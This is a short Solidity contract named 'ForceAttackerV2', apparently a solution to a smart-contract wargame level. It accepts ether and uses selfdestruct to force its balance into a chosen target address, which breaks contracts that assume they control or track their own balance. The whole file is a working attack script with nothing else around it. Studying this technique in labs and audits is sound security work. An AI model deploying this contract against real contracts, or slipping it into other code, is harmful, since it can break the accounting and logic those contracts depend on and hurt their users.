// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttackerV2 {
    constructor() payable {}
    
    receive() external payable {}
    
    function attack(address _target) public payable {
        selfdestruct(payable(_target));
    }
}